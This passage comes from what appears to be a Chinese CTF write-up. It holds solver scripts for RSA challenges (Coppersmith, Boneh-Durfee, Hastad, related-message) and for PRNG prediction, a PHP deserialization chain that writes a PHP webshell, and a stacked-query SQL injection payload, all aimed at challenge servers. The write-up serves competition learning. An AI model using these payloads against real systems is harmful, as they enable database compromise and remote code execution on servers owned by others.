    <span class="hljs-keyword">P</span>.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(<span class="hljs-keyword">N</span>))
    beta = <span class="hljs-number">0.5</span>
    dd = <span class="hljs-keyword">f</span>.degree()    # Degree of the polynomial
    epsilon = beta/<span class="hljs-number">7</span>
    XX = <span class="hljs-built_in">ceil</span>(<span class="hljs-keyword">N</span>**((beta**<span class="hljs-number">2</span>/dd) - epsilon))
    rt = <span class="hljs-keyword">f</span>.small_roots(XX, beta, epsilon)
    <span class="hljs-keyword">return</span> rt

<span class="hljs-keyword">P</span>.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(n))
<span class="hljs-keyword">f</span> = <span class="hljs-keyword">x</span> + half_p
<span class="hljs-keyword">p</span> = half_p + N_factorize(<span class="hljs-keyword">f</span>, n)[<span class="hljs-number">0</span>]

q = <span class="hljs-keyword">int</span>(n) / <span class="hljs-keyword">int</span>(<span class="hljs-keyword">p</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;p = {}, q = {}&#x27;</span>.format(<span class="hljs-keyword">p</span>, q))

phi = (<span class="hljs-keyword">p</span> - <span class="hljs-number">1</span>)*(q - <span class="hljs-number">1</span>)

d = inverse_mod(<span class="hljs-keyword">e</span>, phi)

<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;d: {}&#x27;</span>.format(d.hex()))

<span class="hljs-keyword">m</span> = power_mod(<span class="hljs-keyword">c</span>, d, n)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;m = {}&#x27;</span>.format(<span class="hljs-keyword">m</span>))
m_bytes = long_to_bytes(<span class="hljs-keyword">m</span>)

io.sendlineafter(<span class="hljs-string">&quot;[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, m_bytes.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))


io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 3\n&#x27;</span>)

n = io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>)
n = <span class="hljs-keyword">int</span>(n, <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n:&#x27;</span>, n)

<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e:&#x27;</span>, <span class="hljs-keyword">e</span>)

<span class="hljs-keyword">print</span>(io.recvline())

<span class="hljs-keyword">c</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c:&#x27;</span>, <span class="hljs-keyword">c</span>)

<span class="hljs-keyword">print</span>(io.recvline())

low_d = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;low_d:&#x27;</span>, low_d)

def partial_p(p0, kbits, n):
    PR.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(n))
    nbits = n.nbits()

    <span class="hljs-keyword">f</span> = <span class="hljs-number">2</span>^kbits*<span class="hljs-keyword">x</span> + p0
    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">f</span>.monic()
    roots = <span class="hljs-keyword">f</span>.small_roots(<span class="hljs-keyword">X</span>=<span class="hljs-number">2</span>^(nbits//<span class="hljs-number">2</span>-kbits), beta=<span class="hljs-number">0.3</span>)  # <span class="hljs-keyword">find</span> root &lt; <span class="hljs-number">2</span>^(nbits//<span class="hljs-number">2</span>-kbits) with factor &gt;= n^<span class="hljs-number">0.3</span>
    <span class="hljs-keyword">if</span> root<span class="hljs-variable">s:</span>
        x0 = roots[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">p</span> = gcd(<span class="hljs-number">2</span>^kbits*x0 + p0, n)
        <span class="hljs-keyword">return</span> ZZ(<span class="hljs-keyword">p</span>)

def find_p(d0, kbits, <span class="hljs-keyword">e</span>, n):
    <span class="hljs-keyword">X</span> = var(<span class="hljs-string">&#x27;X&#x27;</span>)

    <span class="hljs-keyword">for</span> <span class="hljs-keyword">k</span> in xrange(<span class="hljs-number">1</span>, <span class="hljs-keyword">e</span>+<span class="hljs-number">1</span>):
        results = solve_mod([<span class="hljs-keyword">e</span>*d0*<span class="hljs-keyword">X</span> - <span class="hljs-keyword">k</span>*<span class="hljs-keyword">X</span>*(n-<span class="hljs-keyword">X</span>+<span class="hljs-number">1</span>) + <span class="hljs-keyword">k</span>*n == <span class="hljs-keyword">X</span>], <span class="hljs-number">2</span>^kbits)
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in result<span class="hljs-variable">s:</span>
            p0 = ZZ(<span class="hljs-keyword">x</span>[<span class="hljs-number">0</span>])
            <span class="hljs-keyword">p</span> = partial_p(p0, kbits, n)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">p</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">p</span>

beta = <span class="hljs-number">0.5</span>
epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>

n = Integer(n)
nbits = n.nbits()
# kbits = <span class="hljs-built_in">floor</span>(nbits*(beta^<span class="hljs-number">2</span>+epsilon))
kbits = <span class="hljs-number">512</span>
d0 = low_d &amp; (<span class="hljs-number">2</span>^kbits-<span class="hljs-number">1</span>)
<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;lower %d bits (of %d bits) is given&quot;</span> % (kbits, nbits)

<span class="hljs-keyword">p</span> = find_p(d0, kbits, <span class="hljs-keyword">e</span>, n)
<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;found p: %d&quot;</span> % <span class="hljs-keyword">p</span>
q = n//<span class="hljs-keyword">p</span>
d = inverse_mod(<span class="hljs-keyword">e</span>, (<span class="hljs-keyword">p</span>-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))

<span class="hljs-keyword">m</span> = power_mod(<span class="hljs-keyword">c</span>, d, n)

io.sendlineafter(<span class="hljs-string">&quot;[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, long_to_bytes(<span class="hljs-keyword">m</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))


io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 4\n&#x27;</span>)

<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])
<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e:&#x27;</span>, <span class="hljs-keyword">e</span>)

<span class="hljs-keyword">print</span>(io.recvline())

n1 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
c1 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)

n2 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
c2 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)

n3 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
c3 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)

def CRT(<span class="hljs-built_in">items</span>):
    <span class="hljs-keyword">N</span> = reduce(lambda <span class="hljs-keyword">x</span>, <span class="hljs-keyword">y</span>: <span class="hljs-keyword">x</span> * <span class="hljs-keyword">y</span>, (i[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">items</span>))
    result = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span>, n in item<span class="hljs-variable">s:</span>
        <span class="hljs-keyword">m</span> = <span class="hljs-keyword">N</span> // n
        d, r, s = gmpy2.gcdext(n, <span class="hljs-keyword">m</span>)
        <span class="hljs-keyword">if</span> d != <span class="hljs-number">1</span>: raise Exception(<span class="hljs-string">&quot;Input not pairwise co-prime&quot;</span>)
        result += <span class="hljs-keyword">a</span> * s * <span class="hljs-keyword">m</span>
    <span class="hljs-keyword">return</span> result % <span class="hljs-keyword">N</span>, <span class="hljs-keyword">N</span>
<span class="hljs-keyword">x</span>, n = CRT(([c1, n1], [c2, n2], [c3, n3]))

<span class="hljs-keyword">m</span> = gmpy2.iroot(gmpy2.mpz(<span class="hljs-keyword">x</span>), <span class="hljs-keyword">e</span>)[<span class="hljs-number">0</span>].digits()
io.sendlineafter(<span class="hljs-string">&quot;[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, long_to_bytes(<span class="hljs-keyword">m</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))


io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 5\n&#x27;</span>)

n = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>])
<span class="hljs-keyword">print</span>(io.recvline())
c1 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
c2 = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)

def related_message_attack(c1, c2, diff, <span class="hljs-keyword">e</span>, n):
    PRx.<span class="hljs-symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(n))
    g1 = <span class="hljs-keyword">x</span>^<span class="hljs-keyword">e</span> - c1
    g2 = (<span class="hljs-keyword">x</span>+diff)^<span class="hljs-keyword">e</span> - c2

    def gcd(g1, g2):
        <span class="hljs-keyword">while</span> g2:
            g1, g2 = g2, g1 % g2
        <span class="hljs-keyword">return</span> g1.monic()

    <span class="hljs-keyword">return</span> -gcd(g1, g2)[<span class="hljs-number">0</span>]

m1 = related_message_attack(c1, c2, <span class="hljs-number">1</span>, <span class="hljs-keyword">e</span>, n)
io.sendlineafter(<span class="hljs-string">&quot;[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, long_to_bytes(m1).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))


io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 6\n&#x27;</span>)

n = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(io.recvline())
<span class="hljs-keyword">print</span>(io.recvline())
<span class="hljs-keyword">e</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)
<span class="hljs-keyword">print</span>(io.recvline())

<span class="hljs-keyword">c</span> = <span class="hljs-keyword">int</span>(io.recvline().<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">2</span>].strip().rstrip(<span class="hljs-string">&#x27;L&#x27;</span>), <span class="hljs-number">16</span>)

import boneh_durfee

delta = <span class="hljs-number">0.28</span>
<span class="hljs-keyword">m</span> = <span class="hljs-number">4</span>
t = <span class="hljs-keyword">int</span>((<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*delta) * <span class="hljs-keyword">m</span>)  # optimization from Herrmann <span class="hljs-built_in">and</span> May
<span class="hljs-keyword">X</span> = <span class="hljs-number">2</span>*<span class="hljs-built_in">floor</span>(n^delta)  # this _might_ <span class="hljs-keyword">be</span> too much
Y = <span class="hljs-built_in">floor</span>(n^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>))    # correct <span class="hljs-keyword">if</span> <span class="hljs-keyword">p</span>, q are ~ same size
<span class="hljs-keyword">P</span>.&lt;<span class="hljs-keyword">x</span>,<span class="hljs-keyword">y</span>&gt; = PolynomialRing(ZZ)
A = <span class="hljs-keyword">int</span>((n+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>)
pol = <span class="hljs-number">1</span> + <span class="hljs-keyword">x</span> * (A + <span class="hljs-keyword">y</span>)

solx, soly = boneh_durfee.boneh_durfee(pol, <span class="hljs-keyword">e</span>, <span class="hljs-keyword">m</span>, t, <span class="hljs-keyword">X</span>, Y)
<span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;=== solution found ===&quot;</span>
    <span class="hljs-keyword">if</span> False:
        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;x:&quot;</span>, solx
        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;y:&quot;</span>, soly

    d = <span class="hljs-keyword">int</span>(pol(solx, soly) / <span class="hljs-keyword">e</span>)
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;private key found:&quot;</span>, d
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;=== no solution was found ===&quot;</span>

<span class="hljs-keyword">m</span> = power_mod(<span class="hljs-keyword">c</span>, d, n)
io.sendlineafter(<span class="hljs-string">&quot;[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=&quot;</span>, long_to_bytes(<span class="hljs-keyword">m</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>))

io.interactive()</code></pre><h3 id="randomstudy"><a class="header-link" href="#randomstudy"></a>randomstudy</h3>
<p>第一个随机数生成算法在时间同步的情况下，即可bypass。
第二个随机数生成算法采用的是Java中的线性随机数生成算法，在已有两个数的情况下，即可计算出线性关系。稍微需要注意的是随机数生成后模了一个数，在计算线性关系时需先还原。
第三个<code>random.getrandbits</code>在已知624个已生成的数字时就可以计算出内部状态。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_int32
<span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack

<span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>

io = remote(<span class="hljs-string">&#x27;119.3.245.36&#x27;</span>, <span class="hljs-number">23456</span>)
io.recvline()
sha_hash = io.recvline().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip()
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hash&#x27;</span>, <span class="hljs-built_in">repr</span>(sha_hash))

head_str = io.recvline().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>].strip().decode(<span class="hljs-string">&#x27;hex&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pow</span>():</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;i: {}/256&#x27;</span>.<span class="hljs-built_in">format</span>(i))
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
                tail_str = struct.pack(<span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-built_in">chr</span>(i), <span class="hljs-built_in">chr</span>(j), <span class="hljs-built_in">chr</span>(k))
                full_str = head_str + tail_str
                sha1 = hashlib.sha256()
                sha1.update(full_str)
                temp_hash = sha1.hexdigest()
                <span class="hljs-keyword">if</span> temp_hash == sha_hash:
                    <span class="hljs-keyword">return</span> full_str
pow_ans = <span class="hljs-built_in">pow</span>()
<span class="hljs-built_in">print</span>(pow_ans)
io.sendlineafter(<span class="hljs-string">&quot;[-]skr.encode(&#x27;hex&#x27;)=&quot;</span>, pow_ans.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))
io.sendlineafter(<span class="hljs-string">&quot;[+]teamtoken:&quot;</span>, <span class="hljs-string">&quot;our_token_lol&quot;</span>)

io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 1\n&#x27;</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Challenge 1&quot;</span>)
random.seed(<span class="hljs-built_in">int</span>(time.time()))
rand_it = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">64</span>)
io.sendlineafter(<span class="hljs-string">&#x27;[-]&#x27;</span>, <span class="hljs-built_in">str</span>(rand_it))


<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Challenge 2&quot;</span>)
io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 2\n&#x27;</span>)
v1 = c_int32(<span class="hljs-built_in">int</span>(io.recvline().split(<span class="hljs-string">&#x27;]&#x27;</span>)[<span class="hljs-number">1</span>])).value
<span class="hljs-keyword">if</span> v1 &lt; <span class="hljs-number">0</span>:
    v1 += <span class="hljs-number">1</span>
v2 = c_int32(<span class="hljs-built_in">int</span>(io.recvline().split(<span class="hljs-string">&#x27;]&#x27;</span>)[<span class="hljs-number">1</span>])).value
<span class="hljs-keyword">if</span> v2 &lt; <span class="hljs-number">0</span>:
    v2 += <span class="hljs-number">1</span>

o = subprocess.check_output(<span class="hljs-string">&#x27;foresee java nextInt -o {} {} -c 1&#x27;</span>.<span class="hljs-built_in">format</span>(v1, v2).split())
v3 = <span class="hljs-built_in">int</span>(o.strip())

<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;v=&#x27;</span>, v1, v2, v3)
io.sendlineafter(<span class="hljs-string">&#x27;[-]&#x27;</span>, <span class="hljs-built_in">str</span>(v3))

<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Challenge 3&quot;</span>)
io.recvuntil(<span class="hljs-string">&#x27;Generating challenge 3\n&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_randbits</span>():</span>
    io.sendlineafter(<span class="hljs-string">&#x27;[-]&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(io.recvline().split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])

rc = RandCrack()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">624</span>):
    t = read_randbits()
    <span class="hljs-built_in">print</span>(t)
    rc.submit(t)

target = rc.predict_getrandbits(<span class="hljs-number">32</span>)
io.sendlineafter(<span class="hljs-string">&#x27;[-]&#x27;</span>, <span class="hljs-built_in">str</span>(target))


io.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>WEB</h2>
<h3 id="upload"><a class="header-link" href="#upload"></a>UPLOAD</h3>
<p>扫到</p>
<blockquote>
<p><a href="http://49.4.26.104:31709/www.tar.gz">http://49.4.26.104:31709/www.tar.gz</a></p>
</blockquote>
<p>反序列化</p>
<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>{
   <span class="hljs-title">class</span> <span class="hljs-title">Profile</span>
   {
       <span class="hljs-title">public</span> $<span class="hljs-title">checker</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;
  
       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)
       </span>{
           <span class="hljs-keyword">$this</span>-&gt;checker = <span class="hljs-number">0</span>;
           <span class="hljs-keyword">$this</span>-&gt;ext = <span class="hljs-number">1</span>;
           <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-string">&quot;index&quot;</span>] = <span class="hljs-string">&quot;upload_img&quot;</span>;
           <span class="hljs-keyword">$this</span>-&gt;upload_menu = <span class="hljs-string">&quot;f1sh233&quot;</span>;
           <span class="hljs-keyword">$this</span>-&gt;img = <span class="hljs-string">&quot;&quot;</span>;
           <span class="hljs-keyword">$this</span>-&gt;filename_tmp = <span class="hljs-string">&quot;upload/f2c0a02c43171da197bb1168a55ce619/b8987a6b91f51f7e272c3f86b9e24add.png&quot;</span>;
           <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;upload/233233.php&quot;</span>;
       }

       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>{
           <span class="hljs-keyword">echo</span> <span class="hljs-number">233</span>;
       }
  
       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)
       </span>{
           <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];
       }
 
       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)
       </span>{
           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;{<span class="hljs-variable">$name</span>}){
               <span class="hljs-keyword">$this</span>-&gt;{<span class="hljs-keyword">$this</span>-&gt;{<span class="hljs-variable">$name</span>}}(<span class="hljs-variable">$arguments</span>);
           }
       }
  
   }
   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span>
   </span>{
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;
       <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;

       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)
       </span>{
           <span class="hljs-keyword">$this</span>-&gt;registed=<span class="hljs-number">0</span>;
           <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-variable">$a</span>;
       }

       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)
       </span>{
           <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed){
               <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();
           }
       }
   }
}

<span class="hljs-keyword">namespace</span>{
   $<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>\<span class="hljs-title">Profile</span>;
   <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> app\web\controller\Register(<span class="hljs-variable">$a</span>);
   <span class="hljs-variable">$c</span> = [<span class="hljs-string">&quot;ID&quot;</span>=&gt;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;test&quot;</span>=&gt;[<span class="hljs-variable">$b</span>]];
   var_dump(<span class="hljs-variable">$c</span>);
   <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$c</span>);
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
   <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$c</span>));
   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
}</code></pre><p>生成payload，更改cookie，getshell：</p>
<p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceab8a7f23c224533.png" alt=""></p>
<h3 id="随便注"><a class="header-link" href="#随便注"></a>随便注</h3>
<p>过滤了union select，没办法跨表，但是可以堆叠查询，那么猜测是用mysqli_multi_query()函数进行sql语句查询的，也就可以使用set @sql = concat(‘create table ‘,newT,’ like ‘,old);
prepare s1 from @sql;
execute s1;
预处理
最后由于表名是数字表名所以要加上反引号
payload</p>
<pre class="hljs"><code><span class="hljs-attribute">1</span>&#x27;;set%<span class="hljs-number">0</span>a@s=concat(CHAR(<span class="hljs-number">115</span>),CHAR(<span class="hljs-number">101</span>),CHAR(<span class="hljs-number">108</span>),CHAR(<span class="hljs-number">101</span>),CHAR(<span class="hljs-number">99</span>),CHAR(<span class="hljs-number">116</span>),CHAR(<span class="hljs-number">32</span>),CHAR(<span class="hljs-number">102</span>),CHAR(<span class="hljs-number">108</span>),CHAR(<span class="hljs-number">97</span>),CHAR(<span class="hljs-number">103</span>),CHAR(<span class="hljs-number">32</span>),CHAR(<span class="hljs-number">102</span>),CHAR(<span class="hljs-number">114</span>),CHAR(<span class="hljs-number">111</span>),CHAR(<span class="hljs-number">109</span>),CHAR(<span class="hljs-number">32</span>),CHAR(<span class="hljs-number">96</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">57</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">57</span>),CHAR(<span class="hljs-number">56</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">48</span>),CHAR(<span class="hljs-number">57</span>),CHAR(<span class="hljs-number">51</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">52</span>),CHAR(<span class="hljs-number">53</span>),CHAR(<span class="hljs-number">49</span>),CHAR(<span class="hljs-number">52</span>),CHAR(<span class="hljs-number">96</span>),CHAR(<span class="hljs-number">59</span>));PREPARE%<span class="hljs-number">0</span>as<span class="hljs-number">2</span>%<span class="hljs-number">0</span>aFROM%<span class="hljs-number">0</span>a@s;EXECUTE%<span class="hljs-number">0</span>as<span class="hljs-number">2</span>;--+</code></pre><h3 id="高明的黑客"><a class="header-link" href="#高明的黑客"></a>高明的黑客</h3>
<p>fuzz 所有 GET/POST 参数</p>
<pre class="hljs"><code>import requests
import re
import os

files = os<span class="hljs-selector-class">.listdir</span>(<span class="hljs-string">&#x27;/Users/f1sh/Downloads/qwb/web2/src/&#x27;</span>)
re1 = r<span class="hljs-string">&quot;\$_POST\[&#x27;(.*?)&#x27;\]&quot;</span>
re2 = r<span class="hljs-string">&quot;\$_GET\[&#x27;(.*?)&#x27;\]&quot;</span>
post = <span class="hljs-selector-attr">[]</span>
get = <span class="hljs-selector-attr">[]</span>

<span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
   with open(<span class="hljs-string">&#x27;/Users/f1sh/Downloads/qwb/web2/src/&#x27;</span>+file,<span class="hljs-string">&#x27;r&#x27;</span>) as f:
       text = f<span class="hljs-selector-class">.read</span>()<span class="hljs-selector-class">.strip</span>()
   pattern1 = re<span class="hljs-selector-class">.compile</span>(re1)
   pattern2 = re<span class="hljs-selector-class">.compile</span>(re2)
   post =  pattern1<span class="hljs-selector-class">.findall</span>(text)
   get = pattern2<span class="hljs-selector-class">.findall</span>(text)
